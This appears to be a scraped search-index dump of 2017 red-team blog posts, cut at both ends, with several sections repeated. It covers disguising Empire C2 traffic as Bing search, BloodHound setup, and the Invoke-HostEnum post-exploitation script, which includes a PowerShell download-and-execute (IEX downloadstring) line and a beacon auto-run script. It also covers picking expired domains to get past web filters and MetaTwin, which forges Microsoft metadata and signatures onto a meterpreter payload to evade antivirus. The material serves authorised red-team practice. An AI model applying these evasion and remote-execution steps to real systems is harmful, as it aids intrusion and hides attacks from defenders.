sysinfo checkin that returns the agent . ps1 # STAGE2_URI = \" index.php \" STAGE2_URI = \" news \" # the default delay ( in seconds ) for agent callback # DEFAULT_DELAY = 5 DEFAULT_DELAY = 10 # the default jitter ( 0 . 0 - 1 . 0 ) to apply to the callback delay # DEFAULT_JITTER = 0 . 0 DEFAULT_JITTER = 0 . 5 # the default traffic profile to use for agent communications # format -> requestUris | user_agent | additionalHeaders # DEFAULT_PROFILE = \" /admin/get.php,/news.asp,/login/process.jsp|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko \" DEFAULT_PROFILE = \" /search?q=news&go=Search&qs=bs&form=QBRE,/search?q=weather&go=Search&qs=bs&form=QBRE,/search?q=movie%20tickets&go=Search&qs=bs&form=QBRE,/search?q=unit%20conversion&go=Search&qs=bs&form=QBRE|Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko|Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8|Cookie:DUP=Q=GpO1nJpMnam4UllEfmeMdg2&T=283767088&A=1&IG \" # the server version to appear as # SERVER_VERSION = \" Microsoft-IIS/7.5 \" SERVER_VERSION = \" Microsoft-IIS/8.5 \" Finally, setup the new database and restart Empire 1 2 . / setup / setup_database . py . / empire","title":"Modifying the staging URIs and Server header"},{"location":"blogs/2017/empire-modifying-server-c2-indicators/#results","text":"Notice we now have new staging URI's that don't stick out quite as much and the new client communication profile is also in use. The staging request length's don't change however so there is still plenty to signature. Empire \u2013 Custom Bing Search Profile w/ Modified Staging URIs","title":"Results"},{"location":"blogs/2017/empire-modifying-server-c2-indicators/#modifying-the-default-page","text":"You can modify the default HTML displayed upon a GET request in lib/common/http.py within the \u201cdefault_page()\u201d function. Edit lib/common/http.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 # lib/common/http.py \"\"\" HTTP related methods used by Empire. Includes URI validation/checksums, as well as the base http server (EmpireServer) and its modified request handler (RequestHandler). These are the first places URI requests are processed. \"\"\" from BaseHTTPServer import BaseHTTPRequestHandler , HTTPServer from SocketServer import ThreadingMixIn import BaseHTTPServer , threading , ssl , os , string , random from pydispatch import dispatcher import re # Empire imports import encryption import helpers #TODO: place this in a config def default_page (): \"\"\" Returns the default page for this server. \"\"\" # Change the default look and redirect requests to a targeted resource (i.e. Organization portal, website, etc) #page = \"<html><head><meta http-equiv=\"refresh\" content=\"0; url=http://www.bing.com/search\"/></head></html>\" # Return some basic Bing Search content page = \"\"\"<!DOCTYPE html><html lang=\"en\" xml:lang=\"en\" xmlns=\"http://www.w3.org/1999/xhtml\" xmlns:Web=\"http://schemas.live.com/Web/\"><script type=\"text/javascript\">//<![CDATA[ si_ST=new Date; //]]></script> <head><!--pc--><title>Search - Bing</title><meta content=\"text/html; charset=utf-8\" http-equiv=\"content-type\" /><link href=\"/search?format=rss&q= &qs=n&form=QBLH&sp=-1&pq= &sc=8-4&sk=&cvid=86384E39A0DC4E01BDC606F982540419\" rel=\"alternate\" title=\"XML\" type=\"text/xml\" /><link href=\"/search?format=rss&q= &qs=n&form=QBLH&sp=-1&pq= &sc=8-4&sk=&cvid=86384E39A0DC4E01BDC606F982540419\" rel=\"alternate\" title=\"RSS\" type=\"application/rss+xml\" /><link href=\"/sa/simg/bing_p_rr_teal_min.ico\" rel=\"shortcut icon\" /><script type=\"text/javascript\">//<![CDATA[ _G={ST:(si_ST?si_ST:new Date),Mkt:\"en-US\",RTL:false,Ver:\"19\",IG:\"9C0DE865AEED4CEFB65F1D19E0EE4511\",EventID:\"77EF28E2D73B45CE9C515CDE44BF2532\",V:\"web\",P:\"SERP\",DA:\"DB5\",SUIH:\"0InL-dxZ9p-UKoWZWyKO6A\",gpUrl:\"\\/fd\\/ls\\/GLinkPing.aspx?\" }; _G.lsUrl=\"/fd/ls/l?IG=\"+_G.IG ;curUrl=\"http:\\/\\/www.bing.com\\/search\";function si_T(a){ if(document.images){_G.GPImg=new Image;_G.GPImg.src=_G.gpUrl+'IG='+_G.IG+'&'+a;}return true;};0;0; //]]></script></head> </html> \"\"\" return page Restart Empire with your new server C2 parameters . / empire","title":"Modifying the default page"},{"location":"blogs/2017/empire-modifying-server-c2-indicators/#results_1","text":"","title":"Results"},{"location":"blogs/2017/empire-modifying-server-c2-indicators/#summary","text":"The ability to modify the network indicators of your C2 technology is critical for a threat representative engagement. While Empire doesn't expose all desired possibilities with the \u201cDefaultProfile\u201d configuration setting, a little exploration into the source reveals more flexibility. Never be afraid to dive into a tool's source and modify it to suit your needs. There are still many ways to signature this traffic and beaconing activity. However, by implementing these modifications your C2 won't completely match the out-of-the-box Empire look and will raise the bar slightly for the Blue guys ;).","title":"Summary"},{"location":"blogs/2017/install-bloodhound-ubuntu/","text":"Installing BloodHound on Ubuntu - A Quick Reference Guide \u00b6 Joe Vest | October 9, 2017 | Tweet This Post: This post is intended as a quick reference guide to install Bloodhound on an Ubuntu system. This is heavily based on https://popped.io/setting-up-bloodhound-on-debian-jessie/ with a few tweaks. Install Ubuntu \u00b6 Install Ubuntu as you normally would. In this case Xubuntu 16.04 was installed in VMWare Optional \u2013 Install VM Tools \u00b6 1 2 3 4 sudo apt - get update sudo apt - get upgrade sudo apt - get install open - vm - tools open - vm - tools - desktop reboot Install Neo4j \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 sudo apt - get install wget curl git wget - O - https : // debian . neo4j . org / neotechnology . gpg . key | sudo apt - key add - echo 'deb http://debian.neo4j.org/repo stable/' | sudo tee / etc / apt / sources . list . d / neo4j . list echo \"deb http://httpredir.debian.org/debian jessie-backports main\" | sudo tee - a / etc / apt / sources . list . d / jessie - backports . list sudo apt - get update sudo apt - get install openjdk - 8 - jdk openjdk - 8 - jre sudo apt - get install neo4j echo \"dbms.active_database=graph.db\" >> / etc / neo4j / neo4j . conf echo \"dbms.connector.http.address=0.0.0.0:7474\" >> / etc / neo4j / neo4j . conf echo \"dbms.connector.bolt.address=0.0.0.0:7687\" >> / etc / neo4j / neo4j . conf echo \"dbms.allow_format_migration=true\" >> / etc / neo4j / neo4j . conf Get Bloodhound DB for neo4j \u00b6 1 2 3 4 5 6 git clone https : // github . com / adaptivethreat / BloodHound . git cd BloodHound mkdir / var / lib / neo4j / data / databases / graph . db cd BloodHound / cp - R BloodHoundExampleDB . graphdb /* /var/lib/neo4j/data/databases/graph.db neo4j start Verify neo4j is running on 7474 and 7687 \u00b6 1 netstat - lantp Change neo4j password \u00b6 Logon to http://localhost:7474 with neo4j:neo4j and change the password Get Bloodhound binary \u00b6 Download the appropriate binary from Run Bloodhound \u00b6 1 . / Bloodhound Supply the user \"neo4j\" and your newly created password. Happy hunting! References: \u00b6","title":"Install BloodHound on Ubuntu"},{"location":"blogs/2017/install-bloodhound-ubuntu/#installing-bloodhound-on-ubuntu-a-quick-reference-guide","text":"Joe Vest | October 9, 2017 | Tweet This Post: This post is intended as a quick reference guide to install Bloodhound on an Ubuntu system. This is heavily based on https://popped.io/setting-up-bloodhound-on-debian-jessie/ with a few tweaks.","title":"Installing BloodHound on Ubuntu - A Quick Reference Guide"},{"location":"blogs/2017/install-bloodhound-ubuntu/#install-ubuntu","text":"Install Ubuntu as you normally would. In this case Xubuntu 16.04 was installed in VMWare","title":"Install Ubuntu"},{"location":"blogs/2017/install-bloodhound-ubuntu/#optional-install-vm-tools","text":"1 2 3 4 sudo apt - get update sudo apt - get upgrade sudo apt - get install open - vm - tools open - vm - tools - desktop reboot","title":"Optional \u2013 Install VM Tools"},{"location":"blogs/2017/install-bloodhound-ubuntu/#install-neo4j","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 sudo apt - get install wget curl git wget - O - https : // debian . neo4j . org / neotechnology . gpg . key | sudo apt - key add - echo 'deb http://debian.neo4j.org/repo stable/' | sudo tee / etc / apt / sources . list . d / neo4j . list echo \"deb http://httpredir.debian.org/debian jessie-backports main\" | sudo tee - a / etc / apt / sources . list . d / jessie - backports . list sudo apt - get update sudo apt - get install openjdk - 8 - jdk openjdk - 8 - jre sudo apt - get install neo4j echo \"dbms.active_database=graph.db\" >> / etc / neo4j / neo4j . conf echo \"dbms.connector.http.address=0.0.0.0:7474\" >> / etc / neo4j / neo4j . conf echo \"dbms.connector.bolt.address=0.0.0.0:7687\" >> / etc / neo4j / neo4j . conf echo \"dbms.allow_format_migration=true\" >> / etc / neo4j / neo4j . conf","title":"Install Neo4j"},{"location":"blogs/2017/install-bloodhound-ubuntu/#get-bloodhound-db-for-neo4j","text":"1 2 3 4 5 6 git clone https : // github . com / adaptivethreat / BloodHound . git cd BloodHound mkdir / var / lib / neo4j / data / databases / graph . db cd BloodHound / cp - R BloodHoundExampleDB . graphdb /* /var/lib/neo4j/data/databases/graph.db neo4j start","title":"Get Bloodhound DB for neo4j"},{"location":"blogs/2017/install-bloodhound-ubuntu/#verify-neo4j-is-running-on-7474-and-7687","text":"1 netstat - lantp","title":"Verify neo4j is running on 7474 and 7687"},{"location":"blogs/2017/install-bloodhound-ubuntu/#change-neo4j-password","text":"Logon to http://localhost:7474 with neo4j:neo4j and change the password","title":"Change neo4j password"},{"location":"blogs/2017/install-bloodhound-ubuntu/#get-bloodhound-binary","text":"Download the appropriate binary from","title":"Get Bloodhound binary"},{"location":"blogs/2017/install-bloodhound-ubuntu/#run-bloodhound","text":"1 . / Bloodhound Supply the user \"neo4j\" and your newly created password. Happy hunting!","title":"Run Bloodhound"},{"location":"blogs/2017/install-bloodhound-ubuntu/#references","text":"","title":"References:"},{"location":"blogs/2017/invoke-hostenum/","text":"HostEnum - A PowerShell Host Situational Awareness Tool \u00b6 Andrew Chiles | May 2, 2017 | Tweet This Post: Overview \u00b6 During a Red Team engagement, performing detailed Situational Awareness (SA) or enumeration on initial and subsequent host compromises is vital. Every good pen-tester or red teamer has their list of go-to scripts, commands, or \"pasties\" to run once initial shell access is achieved. The goal is to quickly learn as much about your environment as possible; including defenses, system configuration, interesting files, and opportunities for persistence and lateral movement. Moreover, when working in large and/or distributed teams, a common tool-base and procedure set is crucial to ensure that necessary enumeration is accomplished no matter who's behind the keyboard. The first shell is often achieved on a host running the Microsoft Windows Operating System after a phishing/social-engineering attack or Web Application exploit. This makes PowerShell an excellent choice for automating post-exploitation and SA tasks. Invoke-HostEnum is a PowerShell 2.0 compatible enumeration script intended to be executed through a remote access capability such as Cobalt Strike's Beacon, Empire, or even a web-shell. All output is pre-formatted into Tables or Lists and converted to a string before returning results for this reason. Earlier internal versions of the script contained many more privilege escalation checks, but the continued development and robustness of PowerUp made these mostly redundant. There are several good examples of PowerShell host enumeration tools including HostRecon by Beau Bullock and Invoke-WinEnum in PowerShell Empire. Invoke-HostEnum borrows functions from these and other modules annotated throughout its source. There was a similarly named Invoke-HostEnum function in PowerView that was removed in 2015, but this is not a resurrected version. I've started to remove many (but not all) binary dependencies to avoid triggering potential alerts from running numerous common built-in Windows command-line enumeration tools in rapid succession. However, there is always room for improvement and contributions and suggestions to the Github repository are highly encouraged! Features \u00b6 The following is a comprehensive list of the items currently enumerated by Invoke-HostEnum. Some enumerations functions require local administrator rights for best results and will result in no or limited results when run under a limited user context. OS Details, Hostname, Uptime, Installdate, Architecture Installed Applications and Patches Network Adapter Configuration, Network Shares, Connections, Routing Table, DNS Cache Running Processes (with full command line) and Installed Services Interesting Registry Entries (SNMP strings, Saved Putty Sessions) Local Users, Groups, and Administrators Personal Security Product Status Interesting file locations (Current User Profile) and keyword searches via file indexing Recycle Bin Contents Interesting Windows Logs (Get-ComputerDetails \u2013 Logon Events, AppLocker logs, PowerShell logs, RDP servers) Basic Domain enumeration (users, groups, trusts, domain controllers, account policy, SPNs)-Explicit Credential Logons (Event ID 4648) As usual, you can get the latest version of tools on our GitHub repository. Usage \u00b6 Command Line \u00b6 Execute locally hosted script with console output 1 powershell - ep bypass - c Import - Module . / Invoke - HostEnum . ps1 ; Invoke - HostEnum - Local - Domain Download and execute remotely hosted script 1 powershell -nop -c IEX ( New-Object Net . Webclient ) . downloadstring ( \"\"\"http://yourdomain/Invoke-HostEnum.ps1\"\"\" ); Invoke-HostEnum -Local Execute locally hosted script with HTML report output. If you want the mostly easily readable format and don't mind writing a file to disk, consider using the \"-Path\" option to specify a directory for an HTML formatted report 1 powershell - ep bypass - c Import - Module . / Invoke - HostEnum . ps1 ; Invoke - HostEnum - Local - Path c : programdata Invoke-HostEnum HTML Report Cobalt Strike \u00b6 Import script and execute interactively in a Beacon console 1 2 powershell - import ./ scripts / Invoke - HostEnum . ps1 powershell Invoke - HostEnum - Local - Domain Automatic execution \u2013 Use aggressor script to fire upon new beacon arrivals. This is ideal to implement on your initial interactive/phishing callback Team Server where you want to gather information in the target environment and may be away from the console. Consider combining with a Slack notification script as described in our previous post Slack Notifications for Cobalt Strike or as thoroughly explained by Jeff Dimmock in Slack Bots for Trolls and Work . Note: This code would require slight modification to work for DNS beacons if desired. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 on beacon_initial { enumerate ( $1 ) ; } sub enumerate { if ( -exists script_resource ( \"scripts/Invoke-HostEnum.ps1\" )) { binput ( $1 , \"[*] Executing Invoke-HostEnum\" ) ; bpowershell_import ( $1 , script_resource ( \"scripts/Invoke-HostEnum.ps1\" )) ; bpowershell ( $1 , \"Invoke-HostEnum -Local -Domain\" ) ; } else { berror ( $1 , \"Invoke-HostEnum.ps1 does not exist\" ) ; } } Invoke-HostEnum Execution in Cobalt Strike PowerShell Empire \u00b6 I've also created a basic post-exploitation module for Empire (hostenum.py) that makes executing on an Empire agent extremely easy. Copy scripts to the appropriate Empire path 1 2 cp Invoke - HostEnum . ps1 / data / module_source / situational_awareness / host cp hostenum . py / lib / modules / situational_awareness / host Start Empire 1 # . / empire Interact with agent 1 ( Empire ) > interact Execute the module 1 2 ( Empire : BX1HBE3MZAWGF1BB ) > usemodule situational_awareness / host / hostenum ( Empire : situational_awareness / host / hostenum ) > run Invoke-HostEnum Empire Module Credits \u00b6 Several functions are inspired or pulled directly from the following projects and are referenced in the code where applicable. Any omissions are not intentional. Thanks to the following authors and projects for the great work!","title":"Invoke-Hostenum"},{"location":"blogs/2017/invoke-hostenum/#hostenum-a-powershell-host-situational-awareness-tool","text":"Andrew Chiles | May 2, 2017 | Tweet This Post:","title":"HostEnum - A PowerShell Host Situational Awareness Tool"},{"location":"blogs/2017/invoke-hostenum/#overview","text":"During a Red Team engagement, performing detailed Situational Awareness (SA) or enumeration on initial and subsequent host compromises is vital. Every good pen-tester or red teamer has their list of go-to scripts, commands, or \"pasties\" to run once initial shell access is achieved. The goal is to quickly learn as much about your environment as possible; including defenses, system configuration, interesting files, and opportunities for persistence and lateral movement. Moreover, when working in large and/or distributed teams, a common tool-base and procedure set is crucial to ensure that necessary enumeration is accomplished no matter who's behind the keyboard. The first shell is often achieved on a host running the Microsoft Windows Operating System after a phishing/social-engineering attack or Web Application exploit. This makes PowerShell an excellent choice for automating post-exploitation and SA tasks. Invoke-HostEnum is a PowerShell 2.0 compatible enumeration script intended to be executed through a remote access capability such as Cobalt Strike's Beacon, Empire, or even a web-shell. All output is pre-formatted into Tables or Lists and converted to a string before returning results for this reason. Earlier internal versions of the script contained many more privilege escalation checks, but the continued development and robustness of PowerUp made these mostly redundant. There are several good examples of PowerShell host enumeration tools including HostRecon by Beau Bullock and Invoke-WinEnum in PowerShell Empire. Invoke-HostEnum borrows functions from these and other modules annotated throughout its source. There was a similarly named Invoke-HostEnum function in PowerView that was removed in 2015, but this is not a resurrected version. I've started to remove many (but not all) binary dependencies to avoid triggering potential alerts from running numerous common built-in Windows command-line enumeration tools in rapid succession. However, there is always room for improvement and contributions and suggestions to the Github repository are highly encouraged!","title":"Overview"},{"location":"blogs/2017/invoke-hostenum/#features","text":"The following is a comprehensive list of the items currently enumerated by Invoke-HostEnum. Some enumerations functions require local administrator rights for best results and will result in no or limited results when run under a limited user context. OS Details, Hostname, Uptime, Installdate, Architecture Installed Applications and Patches Network Adapter Configuration, Network Shares, Connections, Routing Table, DNS Cache Running Processes (with full command line) and Installed Services Interesting Registry Entries (SNMP strings, Saved Putty Sessions) Local Users, Groups, and Administrators Personal Security Product Status Interesting file locations (Current User Profile) and keyword searches via file indexing Recycle Bin Contents Interesting Windows Logs (Get-ComputerDetails \u2013 Logon Events, AppLocker logs, PowerShell logs, RDP servers) Basic Domain enumeration (users, groups, trusts, domain controllers, account policy, SPNs)-Explicit Credential Logons (Event ID 4648) As usual, you can get the latest version of tools on our GitHub repository.","title":"Features"},{"location":"blogs/2017/invoke-hostenum/#usage","text":"","title":"Usage"},{"location":"blogs/2017/invoke-hostenum/#command-line","text":"Execute locally hosted script with console output 1 powershell - ep bypass - c Import - Module . / Invoke - HostEnum . ps1 ; Invoke - HostEnum - Local - Domain Download and execute remotely hosted script 1 powershell -nop -c IEX ( New-Object Net . Webclient ) . downloadstring ( \"\"\"http://yourdomain/Invoke-HostEnum.ps1\"\"\" ); Invoke-HostEnum -Local Execute locally hosted script with HTML report output. If you want the mostly easily readable format and don't mind writing a file to disk, consider using the \"-Path\" option to specify a directory for an HTML formatted report 1 powershell - ep bypass - c Import - Module . / Invoke - HostEnum . ps1 ; Invoke - HostEnum - Local - Path c : programdata Invoke-HostEnum HTML Report","title":"Command Line"},{"location":"blogs/2017/invoke-hostenum/#cobalt-strike","text":"Import script and execute interactively in a Beacon console 1 2 powershell - import ./ scripts / Invoke - HostEnum . ps1 powershell Invoke - HostEnum - Local - Domain Automatic execution \u2013 Use aggressor script to fire upon new beacon arrivals. This is ideal to implement on your initial interactive/phishing callback Team Server where you want to gather information in the target environment and may be away from the console. Consider combining with a Slack notification script as described in our previous post Slack Notifications for Cobalt Strike or as thoroughly explained by Jeff Dimmock in Slack Bots for Trolls and Work . Note: This code would require slight modification to work for DNS beacons if desired. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 on beacon_initial { enumerate ( $1 ) ; } sub enumerate { if ( -exists script_resource ( \"scripts/Invoke-HostEnum.ps1\" )) { binput ( $1 , \"[*] Executing Invoke-HostEnum\" ) ; bpowershell_import ( $1 , script_resource ( \"scripts/Invoke-HostEnum.ps1\" )) ; bpowershell ( $1 , \"Invoke-HostEnum -Local -Domain\" ) ; } else { berror ( $1 , \"Invoke-HostEnum.ps1 does not exist\" ) ; } } Invoke-HostEnum Execution in Cobalt Strike","title":"Cobalt Strike"},{"location":"blogs/2017/invoke-hostenum/#powershell-empire","text":"I've also created a basic post-exploitation module for Empire (hostenum.py) that makes executing on an Empire agent extremely easy. Copy scripts to the appropriate Empire path 1 2 cp Invoke - HostEnum . ps1 / data / module_source / situational_awareness / host cp hostenum . py / lib / modules / situational_awareness / host Start Empire 1 # . / empire Interact with agent 1 ( Empire ) > interact Execute the module 1 2 ( Empire : BX1HBE3MZAWGF1BB ) > usemodule situational_awareness / host / hostenum ( Empire : situational_awareness / host / hostenum ) > run Invoke-HostEnum Empire Module","title":"PowerShell Empire"},{"location":"blogs/2017/invoke-hostenum/#credits","text":"Several functions are inspired or pulled directly from the following projects and are referenced in the code where applicable. Any omissions are not intentional. Thanks to the following authors and projects for the great work!","title":"Credits"},{"location":"blogs/2017/leveraging-expired-domains-for-red-team-engagements/","text":"Leveraging Expired Domains for Red Team Engagements \u00b6 Andrew Chiles | March 1, 2017 | Tweet This Post: Overview \u00b6 Domain name selection is an important aspect of preparation for phishing scenarios, penetration tests, and especially Red Team engagements. It is increasingly common to be faced with web filtering in a network based on domain reputation and categorization. Often traffic to very new and/or uncategorized domains is completely blocked by such appliances \u2013 stopping your phishing payload or C2 agent in their tracks. There's been a lot of talk about Domain Fronting and High Trust Redirectors in the security community lately to deal with this same issue, but that's an extra layer of configuration and complexity that's probably not necessary for every engagement. See MDSec \u2013 Domain Fronting via Cloudfront Alternate Domains and Raphael Mudge's blog for more on those techniques. Domains that were once used for benign purposes and already properly categorized often expire or are deleted, but they can be purchased again for only a few dollars. Such domains enable a team to bypass reputation based web filters and network egress restrictions for phishing and C2 related tasks. Enter ExpiredDomains.net \u2013 the expired domain names search engine. This is a great resource for pentesters and red teamers looking for a quick \"fast-food menu\" of available domains when they don't want or have the luxury of time to develop a catalog of domains, maintain web servers, and create \"legit content\" for proper categorization, only to see them quickly burned on an op. There's certainly a case for maintaining some domains over time, but again you probably don't want to use them for quick one or two week engagements. Thus we started working on DomainHunter ( https://github.com/threatexpress/domainhunter ) back in September 2016, a small script that would take advantage of Expireddomains.net listings and cross them with known reputation sources to generate a list of potential domains for upcoming engagements. Mr-Un1k0d3r created CatMyFish which also leverages the Expireddomains.net listing and is worth a look. DomainHunter was written to quickly query the Expireddomains.net search engine for expired/deleted domains and automatically remove any already reported by Malwaredomains.com. It then optionally queries for domain reputation against services like Blue Coat WebPulse Site Review. Note: Most domain reputation services such as Blue Coat employ CAPTCHA protections that must be avoided by slowing down scripted requests, thus if running over large query sets we recommend executing as a scheduled/cron job and have new options e-mailed to you periodically. Additionally, after around 150 requests to Blue Coat, you'll start receiving the captcha even with the intentionally slow timing programmed into DomainHunter. Let us ( @joevest @andrewchiles ) know on Twitter if you find the tool useful or have recommendations and improvements! Example HTML Report Output for \"bank\" Source on Github DomainHunter \u00b6 Features \u00b6 Retrieves specified number of recently expired and deleted domains (.com, .net, .org primarily) Retrieves available domains based on keyword search Performs reputation checks against the Blue Coat Site Review service Sorts results by domain age (if known) Generates Text-based table and HTML report output with links to reputation sources and associated Archive.org entry Usage \u00b6 Install all necessary Python requirements 1 cd . / domainhunter / && pip install - r requirements . txt List available options 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 python . / domainhunter . py - h usage : domainhunter . py [ - h ] [ - q QUERY ] [ - c ] [ - r MAXRESULTS ] [ - w MAXWIDTH ] Checks expired domains , bluecoat categorization , and Archive . org history to determine good candidates for C2 and phishing domains optional arguments : - h , -- help show this help message and exit - q QUERY , -- query QUERY Optional keyword used to refine search results - c , -- check Perform slow reputation checks - r MAXRESULTS , -- maxresults MAXRESULTS Number of results to return when querying latest expired / deleted domains ( min . 100 ) - w MAXWIDTH , -- maxwidth MAXWIDTH Width of text table Execute a basic query with reputation checks 1 python . / domainhunter . py - q dogs - c Example Console Output with Reputation Checking Additional Resources \u00b6","title":"Leveraging Expired Domains for Red Team Engagements"},{"location":"blogs/2017/leveraging-expired-domains-for-red-team-engagements/#leveraging-expired-domains-for-red-team-engagements","text":"Andrew Chiles | March 1, 2017 | Tweet This Post:","title":"Leveraging Expired Domains for Red Team Engagements"},{"location":"blogs/2017/leveraging-expired-domains-for-red-team-engagements/#overview","text":"Domain name selection is an important aspect of preparation for phishing scenarios, penetration tests, and especially Red Team engagements. It is increasingly common to be faced with web filtering in a network based on domain reputation and categorization. Often traffic to very new and/or uncategorized domains is completely blocked by such appliances \u2013 stopping your phishing payload or C2 agent in their tracks. There's been a lot of talk about Domain Fronting and High Trust Redirectors in the security community lately to deal with this same issue, but that's an extra layer of configuration and complexity that's probably not necessary for every engagement. See MDSec \u2013 Domain Fronting via Cloudfront Alternate Domains and Raphael Mudge's blog for more on those techniques. Domains that were once used for benign purposes and already properly categorized often expire or are deleted, but they can be purchased again for only a few dollars. Such domains enable a team to bypass reputation based web filters and network egress restrictions for phishing and C2 related tasks. Enter ExpiredDomains.net \u2013 the expired domain names search engine. This is a great resource for pentesters and red teamers looking for a quick \"fast-food menu\" of available domains when they don't want or have the luxury of time to develop a catalog of domains, maintain web servers, and create \"legit content\" for proper categorization, only to see them quickly burned on an op. There's certainly a case for maintaining some domains over time, but again you probably don't want to use them for quick one or two week engagements. Thus we started working on DomainHunter ( https://github.com/threatexpress/domainhunter ) back in September 2016, a small script that would take advantage of Expireddomains.net listings and cross them with known reputation sources to generate a list of potential domains for upcoming engagements. Mr-Un1k0d3r created CatMyFish which also leverages the Expireddomains.net listing and is worth a look. DomainHunter was written to quickly query the Expireddomains.net search engine for expired/deleted domains and automatically remove any already reported by Malwaredomains.com. It then optionally queries for domain reputation against services like Blue Coat WebPulse Site Review. Note: Most domain reputation services such as Blue Coat employ CAPTCHA protections that must be avoided by slowing down scripted requests, thus if running over large query sets we recommend executing as a scheduled/cron job and have new options e-mailed to you periodically. Additionally, after around 150 requests to Blue Coat, you'll start receiving the captcha even with the intentionally slow timing programmed into DomainHunter. Let us ( @joevest @andrewchiles ) know on Twitter if you find the tool useful or have recommendations and improvements! Example HTML Report Output for \"bank\" Source on Github","title":"Overview"},{"location":"blogs/2017/leveraging-expired-domains-for-red-team-engagements/#domainhunter","text":"","title":"DomainHunter"},{"location":"blogs/2017/leveraging-expired-domains-for-red-team-engagements/#features","text":"Retrieves specified number of recently expired and deleted domains (.com, .net, .org primarily) Retrieves available domains based on keyword search Performs reputation checks against the Blue Coat Site Review service Sorts results by domain age (if known) Generates Text-based table and HTML report output with links to reputation sources and associated Archive.org entry","title":"Features"},{"location":"blogs/2017/leveraging-expired-domains-for-red-team-engagements/#usage","text":"Install all necessary Python requirements 1 cd . / domainhunter / && pip install - r requirements . txt List available options 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 python . / domainhunter . py - h usage : domainhunter . py [ - h ] [ - q QUERY ] [ - c ] [ - r MAXRESULTS ] [ - w MAXWIDTH ] Checks expired domains , bluecoat categorization , and Archive . org history to determine good candidates for C2 and phishing domains optional arguments : - h , -- help show this help message and exit - q QUERY , -- query QUERY Optional keyword used to refine search results - c , -- check Perform slow reputation checks - r MAXRESULTS , -- maxresults MAXRESULTS Number of results to return when querying latest expired / deleted domains ( min . 100 ) - w MAXWIDTH , -- maxwidth MAXWIDTH Width of text table Execute a basic query with reputation checks 1 python . / domainhunter . py - q dogs - c Example Console Output with Reputation Checking","title":"Usage"},{"location":"blogs/2017/leveraging-expired-domains-for-red-team-engagements/#additional-resources","text":"","title":"Additional Resources"},{"location":"blogs/2017/metatwin-borrowing-microsoft-metadata-and-digital-signatures-to-hide-binaries/","text":"Borrowing Microsoft MetaData and Signatures to Hide Binary Payloads \u00b6 Joe Vest | October 9, 2017 | Tweet This Post: Overview \u00b6 A twitter post by Casey Smith (@subtee) inspired me to update a tool written by Andrew Chiles (@andrewchiles) and I a few years ago. During a Red Team engagement, it can be helpful to blend in with the environment as best as possible when forced to operate from disk. Operating in memory is great, but in many situations or scenarios, you must resort to binaries on disk. A technique I've used with great success is to modify a binary's resource information (metadata). This includes fields such as file icons, version, description, product name, copyright, etc. When defeating security defenses or managing IOCs ( See my SANS Breaking Red webcast series for more on IOC management ), a threat will often attempt to trick or deceive an analyst. Making files blend into the environment can cause an analyst to treat malicious behavior as trusted. If a binary says is it from Microsoft, it must be\u2026 This is where MetaTwin comes into play. This is rewritten to not only modify a binary's metadata, but also add a digital signature as recently described by @subtee and @mattifestation. How MetaTwin Works \u00b6 MetaTwin starts with a legitimate signed source binary, such as explorer.exe Extracts the resources ( via ResourceHacker ) and digital signature information ( via SigThief ) Writes the captured data to a target binary Demo \u00b6 In this example, I'm simply using a default meterpreter reverse_tcp binary. Nothing special here, use any binary (.exe or .dll). Personally, we're huge fans of Cobalt Strike during real engagements. Before MetaTwin After MetaTwin As you can see, the file looks and feels like it could belong there. Storing this in a location such as c:ProgramData... with a modified time stamp, could buy a Red Team operator a bit of time and support long(er) term persistence. Interesting Observations \u00b6 AntiVirus \u00b6 Often simple modifications can cause defensive tools to react in different ways. Of course AV is often not a show stopping defensive tool, but we were curious as to how AV handled a default Metasploit meterpreter binary when modified with MetaTwin. No obfuscation other than the addition of metadata and digital signatures. The results were interesting\u2026 Default Reverse TCP Meterpreter Binary \u00b6 As expected, VirusTotal reported several hits Metadata added to Reverse TCP Meterpreter Binary \u00b6 Interestingly, adding metadata alone reduced the AV detection rate. Metadata and Digital Signature added to Reverse TCP Meterpreter Binary \u00b6 After adding a digital signature and the metadata, exposure dropped from 76% to 58%. This is important because we're not even trying to evade AV! SysInternals AutoRuns \u00b6 In additions to Antivirus, you can see how default tool behavior responds to these modifications using SysInternals AutoRuns. Using the modified binary, we created simple persistence mechanism using a scheduled task. AutoRuns can be used to display this type of Windows persistence. But\u2026 the modified binary is hidden by default. Take a look\u2026 AutoRuns Default Settings Hide the \"Microsoft\" scheduled task \u00b6 \u00b6 AutoRuns Default Options \u00b6 Changing the Default Reveals the \"Microsoft\" scheduled task \u00b6 Takeaway \u00b6 Based on these observations, it's clear that some AV and EDR tools make poor assumptions based on file metadata and digital signatures that can make them less effective or confuse an inexperienced Blue Team member. Red Team operators can use this to their advantage if forced to operate from disk in future engagements. Try MetaTwin Yourself \u00b6","title":"Borrowing Microsoft MetaData and Signatures to Hide Binary Payloads"},{"location":"blogs/2017/metatwin-borrowing-microsoft-metadata-and-digital-signatures-to-hide-binaries/#borrowing-microsoft-metadata-and-signatures-to-hide-binary-payloads","text":"Joe Vest | October 9, 2017 | Tweet This Post:","title":"Borrowing Microsoft MetaData and Signatures to Hide Binary Payloads"},{"location":"blogs/2017/metatwin-borrowing-microsoft-metadata-and-digital-signatures-to-hide-binaries/#overview","text":"A twitter post by Casey Smith (@subtee) inspired me to update a tool written by Andrew Chiles (@andrewchiles) and I a few years ago. During a Red Team engagement, it can be helpful to blend in with the environment as best as possible when forced to operate from disk. Operating in memory is great, but in many situations or scenarios, you must resort to binaries on disk. A technique I've used with great success is to modify a binary's resource information (metadata). This includes fields such as file icons, version, description, product name, copyright, etc. When defeating security defenses or managing IOCs ( See my SANS Breaking Red webcast series for more on IOC management ), a threat will often attempt to trick or deceive an analyst. Making files blend into the environment can cause an analyst to treat malicious behavior as trusted. If a binary says is it from Microsoft, it must be\u2026 This is where MetaTwin comes into play. This is rewritten to not only modify a binary's metadata, but also add a digital signature as recently 